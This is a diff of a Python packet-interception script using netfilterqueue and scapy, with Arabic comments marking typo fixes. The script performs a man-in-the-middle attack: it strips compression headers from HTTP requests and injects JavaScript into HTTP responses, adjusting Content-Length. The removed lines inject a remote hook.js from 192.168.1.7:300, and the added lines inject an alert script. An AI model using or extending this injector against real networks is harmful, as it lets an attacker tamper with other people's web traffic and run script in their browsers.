@@ -1,6 +1,6 @@
-import netfilterqueue
 import scapy.all as scapy
 import re
+import netfilterqueue
 
 def set_load(packet, load):
     packet[scapy.Raw].load = load
@@ -9,25 +9,26 @@ def set_load(packet, load):
     del packet[scapy.TCP].chksum
     return packet
 
-def process_packet(packet):
+def process_packet(packet):  # التصحيح 1: proces_packet -> process_packet
     scapy_packet = scapy.IP(packet.get_payload())
 
     if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
         load = scapy_packet[scapy.Raw].load
-        if scapy_packet[scapy.TCP].dport == 80:
+        if scapy_packet[scapy.TCP].dport == 8080:
             print("[+] HTTP Request")
-            load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", load)
+            load = re.sub(b"Accept-Encoding: .*?\\r\\n", b"", load)
+            load = load.replace(b"HTTP/1.1", b"HTTP/1.0")  # التصحيح 2: إضافة b prefix
 
-        elif scapy_packet[scapy.TCP].sport == 80:
+        elif scapy_packet[scapy.TCP].sport == 8080:
             print("[+] HTTP Response")
-            injection_code = b'<script src="http://192.168.1.7:300/hook.js"></script>'
+            injection_code = b"<script>alert('1');</script>"
             load = load.replace(b"</body>", injection_code + b"</body>")
             content_length_search = re.search(b"(?:Content-Length:\s)(\d*)", load)
 
-            if content_length_search:
+            if content_length_search:  # التصحيح 3: content_lenght_search -> content_length_search
                 content_length = content_length_search.group(1)
-                new_content_length = int(content_lenght) + len(injection_code)
-                new_content_length = b"%d" % (new_content_lenght)
+                new_content_length = int(content_length) + len(injection_code)
+                new_content_length = b"%d" % (new_content_length)
                 load = load.replace(content_length, new_content_length)
 
         if load != scapy_packet[scapy.Raw].load:
@@ -37,7 +38,5 @@ def process_packet(packet):
     packet.accept()
 
 queue = netfilterqueue.NetfilterQueue()
-queue.bind(0, process_packet)
+queue.bind(0, process_packet)  # التصحيح 4: proces_packet -> process_packet
 queue.run()
-
-
